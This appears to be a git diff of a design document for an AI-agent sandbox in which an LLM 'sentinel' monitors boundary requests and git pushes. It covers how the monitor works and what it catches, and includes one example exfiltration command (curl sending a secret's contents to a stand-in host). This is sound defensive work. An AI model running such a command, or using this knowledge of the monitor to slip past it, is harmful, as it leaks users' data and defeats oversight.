@@ -1,39 +1,41 @@
 # Security System
 
-carapace gates every agent action through a two-layer security system: a fast **safe-list** bypass for known-harmless operations, and an LLM-powered **sentinel agent** for everything else. The sentinel maintains a persistent conversation per session, evaluating each action against a natural-language security policy and the full history of what happened so far.
+carapace lets the agent work freely inside its sandbox and reviews where it reaches outside. Agent tools run without review, but every call lands in the session's action log. An LLM-powered **sentinel agent** judges what crosses the boundary: proxy domains, credentials, up-front requests and git pushes. It keeps a persistent conversation per session and decides against a natural-language security policy and the full history of what happened so far.
 
 ## How it works
 
-Every tool call and skill invocation passes through the security module before execution:
-
-1. **Safe-list check.** A hardcoded set of tool names is auto-allowed without any LLM call. `exec` is one of them: the sandbox is the boundary, and what a command wants from outside is reviewed as a [boundary request](#boundary-requests).
-2. **Sentinel evaluation.** All other operations are sent to the sentinel agent -- an LLM that receives the action log, the tool name and arguments, and makes a contextual decision.
+1. **Tool calls are logged, not reviewed.** Every agent tool (`exec`, file edits, `read_skill`, …) runs right away and gets an action log entry and an audit entry (`auto_allowed`), and the UI shows it with `approval_source="safe-list"`, in YOLO mode too (see [Tool calls](#tool-calls)). The name is historical: there is no list.
+2. **Boundary requests are reviewed.** What a command wants from outside the sandbox reaches the sentinel as a [boundary request](#boundary-requests), and every push to the knowledge repo as a [git push evaluation](#git-push-evaluation). The sentinel gets the action log since its last decision with each of them.
 3. **Verdict.** The sentinel is a guard rail, not a reviewer of the agent's work: it stops the agent from going haywire beyond the sandbox, changing what it was not asked to change, exfiltrating data, or following injected instructions, and lets everything else through. It returns one of four decisions:
-   - **allow** -- proceed without interruption, optionally with a comment for the agent (see [Sentinel comments](#sentinel-comments)).
-   - **revise** -- no threat, but the call must not run as it is because it bundles or reaches beyond what the user asked for (split it, narrow its scope, drop the unrequested extra, ask the user in chat, or explain how the step follows from the user's request before retrying it). A better way to the same goal is a comment, not a revise. The operation does not run; the agent receives "Sentinel requests changes (no threat detected): <explanation>" and continues. Only offered for tool calls and git pushes, the two places where the explanation reaches the agent. For proxy domain and credential requests an output validator makes the sentinel choose another verdict.
+   - **allow** -- proceed without interruption; on a git push optionally with a comment for the agent (see [Sentinel comments](#sentinel-comments)).
+   - **revise** -- no threat, but the push must not go through as it is because it bundles or reaches beyond what the user asked for (split it, narrow its scope, drop the unrequested extra, ask the user in chat, or explain how the step follows from the user's request before retrying it). A better way to the same goal is a comment, not a revise. The push is rejected; the agent receives "Sentinel requests changes (no threat detected): <explanation>" and continues. Only offered for git pushes, where the explanation reaches the agent. For proxy domain, credential and up-front requests an output validator makes the sentinel choose another verdict.
    - **escalate** -- pause the operation and ask the user for approval.
    - **deny** -- block the operation outright.
-4. **Audit.** Every decision (safe-list or sentinel) is recorded in a per-session audit log.
+4. **Audit.** Every tool call and every decision is recorded in a per-session audit log.
 
 ```mermaid
 flowchart TD
-    ToolCall[Agent calls a tool / skill]
-    SafeList{Tool in safe-list?}
-    Sentinel["Sentinel agent evaluates action
+    Agent[Agent calls a tool]
+    Log[Action log + audit log]
+    Sandbox[Runs in the sandbox]
+    Request["Boundary request or git push
+    (domain, credential, cgate request, push)"]
+    Sentinel["Sentinel agent evaluates the request
     against SECURITY.md policy
     and session context"]
-    Proceed[Operation proceeds]
+    Proceed[Request granted]
     Revise["Agent gets a change request
     and tries another approach"]
     Gate["Approval Gate fires
     (sends prompt to user)"]
-    Blocked[Operation blocked]
+    Blocked[Request blocked]
 
-    ToolCall --> SafeList
-    SafeList -->|yes| Proceed
-    SafeList -->|no| Sentinel
+    Agent --> Log
+    Agent --> Sandbox
+    Sandbox --> Request
+    Request --> Sentinel
     Sentinel -->|allow| Proceed
-    Sentinel -->|revise| Revise
+    Sentinel -->|revise, push only| Revise
     Sentinel -->|escalate| Gate
     Sentinel -->|deny| Blocked
     Gate -->|user approves| Proceed
@@ -42,11 +44,11 @@ flowchart TD
 
 ## Sentinel comments
 
-When the sentinel allows a tool call or git push, it can add a `comment` (at most 500 characters) for the agent: a pitfall, a better approach, something the user said. The `explanation` stays the reason for the audit log; the comment is addressed to the agent.
+When the sentinel allows a git push, it can add a `comment` (at most 500 characters) for the agent: a pitfall, a better approach, something the user said. The `explanation` stays the reason for the audit log; the comment is addressed to the agent.
 
 `SessionSecurity` collects the comments, and `SentinelCommentCapability` puts them into the agent's next model request as a `SystemPromptPart`, right after the tool results. A comment on a push made by an `exec` arrives the same way, after that `exec`'s result. The system voice matters: tool output is untrusted and could forge a comment, and a user prompt part would read as the user speaking. Models with inline system messages (OpenAI, Codex, newer Claude models) get a `system` entry; for the others (e.g. Claude Sonnet 4.6) pydantic-ai sends `<system>`-tagged text in the user turn, and pydantic-ai picks the rendering per model. The comment is appended, so the cached prefix stays intact; for the tag explanation pydantic-ai adds to the standing prompt, see [persistent-context.md](persistent-context.md#prefix-caching).
 
-An output validator rejects a comment on any other verdict, and on proxy domain and credential requests, where only the verdict and its explanation go back to the command that asked (see [Boundary requests](#boundary-requests)). The UI and Matrix show the comment on the tool call (`approval_comment`).
+An output validator rejects a comment on any other verdict, and on proxy domain, credential and up-front requests, where only the verdict and its explanation go back to the command that asked (see [Boundary requests](#boundary-requests)). The UI and Matrix show the comment on the push (`approval_comment`).
 
 ## SECURITY.md -- the policy file
 
@@ -72,6 +74,7 @@ Edit `SECURITY.md` to customize the policy for your setup. The sentinel will imm
 The default is only copied into a knowledge repo that has no `SECURITY.md` yet, so an existing policy keeps the wording of the version it was seeded from. Since `exec` is no longer reviewed, compare yours with `src/carapace/assets/SECURITY.md` and adapt:
 
 - Drop `exec` from the tool calls the sentinel reviews, and replace a section on judging `exec` in the sandbox ("Sandbox and layered defense") with the boundary model ("The sandbox is the boundary").
+- Say that comments and `revise` only exist for git pushes: no tool call is reviewed.
 - Replace "The triggering tool call was already cleared by you or the user", if your copy still has it: no review precedes a domain or credential request.
 - Remove "Read-only shell commands" from the low-risk list.
 - Replace the section on skill activation (`use_skill`) and the bullet "Skill-declared credentials: covered by approval of `use_skill`" with the section "Skills": skills are read with `read_skill`, which grants nothing, and their commands ask with `cgate request`.
@@ -80,26 +83,15 @@ A stale policy does not break anything, but it describes reviews that no longer 
 
 The cap on domain reviews follows the same cut: `agent.max_sentinel_calls_per_tool_call` is now `agent.max_sentinel_calls_per_exec`, since one exec is the scope a review covers. A value saved in the platform settings is carried over by the database migration. Anywhere else the old name fails config validation at start; rename it there.
 
-## Safe-list
+## Tool calls
 
-The following tools are auto-allowed without consulting the sentinel:
+No agent tool is reviewed by itself: `exec`, `read`, `write`, `str_replace`, `read_skill`, `send_file`, `show_artifact` and `read_tool_output` all run right away. The sandbox is the boundary, and a tool reaches outside only through a boundary request or a push, which are reviewed.
 
-| Tool          | Reason                                    |
-| ------------- | ----------------------------------------- |
-| `read`        | File reads are always safe                |
-| `write`       | File writes in the sandbox                |
-| `str_replace` | String replacement edits in sandbox files |
-| `list_skills` | Listing available skills is informational |
-| `show_artifact` | Shows an already pushed artifact; the push itself was reviewed |
-| `read_tool_output` | Only returns tool output this session's agent has already seen |
-| `exec`        | The sandbox is the boundary; the command stays in the action log |
-| `read_skill`  | Reading a skill grants nothing; the call tells the sentinel what later requests are about |
-
-A safe-listed call still gets an action log entry and an audit entry with `approval_source="safe-list"`; it is not a silent bypass. For `exec` that matters: the sentinel sees every command that ran since its last decision with the next boundary request, which is where a sequence like packing up mail and then asking for an upload host shows.
+Each call still gets an action log entry with its full arguments and an audit entry (`auto_allowed`), YOLO mode included; it is not a silent bypass. For `exec` that matters: the sentinel sees every command that ran since its last decision with the next boundary request, which is where a sequence like packing up mail and then asking for an upload host shows. A `read_skill` call tells it which skill the following requests belong to.
 
 Domain and credential requests have no fast path: a domain is reviewed even when it appears literally in the `exec` command, because a command like `curl "https://anything.example/?d=$(cat secret)"` names its destination too.
 
-The safe-list is defined in `src/carapace/security/__init__.py`.
+The autonomy limit (see [sessions-and-channels.md](sessions-and-channels.md)) pauses a long run of tool calls for the user's go; that is a budget, not a review.
 
 ## The sentinel agent
 
@@ -201,8 +193,8 @@ This protects against leftovers, accidental or naive. It does not stop an agent 
 Every security decision is written to a per-session audit log file at `$CARAPACE_DATA_DIR/sessions/<session_id>/audit.yaml`. Each entry includes:
 
 - Timestamp
-- Whether it was a tool call, proxy domain request, or git push
-- The sentinel's verdict (decision, explanation, risk level)
+- Whether it was a tool call, proxy domain request, credential request, or git push (an up-front request is written as one entry per domain and credential)
+- The sentinel's verdict (decision, explanation, risk level), none for a tool call
 - The final decision (may differ if user overrode an escalation; `changes_requested` for a `revise` verdict)
 
 ## Proxy domain requests
@@ -251,7 +243,7 @@ When the agent pushes changes from a sandbox container back to the knowledge rep
 
 When a push changes a `flake.lock`, the sentinel also gets one plain line per changed input, so it does not have to read a lock diff to notice that `nixpkgs` now points somewhere else. Inputs are named by their path from the root flake (`carapace/uv2nix`), and each line says whether the input was added, removed, bumped to another revision of the same source, or **moved to another source** (another owner, repository or URL); a change to what an input follows shows too. There is no allowlist: the lines are information for the review. Every value taken from the lock, and the file's path, is quoted as a JSON string, so a newline in a pushed lock cannot forge a line of this block. A lock that cannot be parsed, or that has more than 500 inputs (the walk follows paths, which a crafted lock can multiply), is reported in one line that points to the raw diff.
 
-Like tool calls and proxy domains, the sentinel can escalate a git push to the user for approval. Push evaluation results (allow, revise, deny, escalate) are broadcast to all session subscribers (WebSocket, Matrix) and recorded in both the action log (`GitPushEntry`) and the audit log.
+Like proxy domains, the sentinel can escalate a git push to the user for approval. Push evaluation results (allow, revise, deny, escalate) are broadcast to all session subscribers (WebSocket, Matrix) and recorded in both the action log (`GitPushEntry`) and the audit log.
 
 If a push is denied or the sentinel requests changes, `git push` fails in the sandbox and the pre-receive hook prints the reason (`Push rejected: Sentinel requests changes (no threat detected): ...`), which the agent reads in git's output.
 
@@ -263,8 +255,7 @@ If the sentinel escalates a domain request, it is forwarded to the user through 
 
 carapace follows strict veto semantics: if **any** part of the security system says "no" (or "needs approval"), that decision is final. This means:
 
-- A safe-list bypass cannot override a sentinel denial (safe-list only applies to its own set of tools).
-- The sentinel cannot override a deterministic denial from the safe-list check (which denies nothing -- it only auto-allows).
+- A sentinel denial of a boundary request or push cannot be overridden by an earlier allow; each request is decided on its own.
 - A user denial on an escalated action is always final.
 
 This makes the system easy to reason about: the strictest judgment always wins.
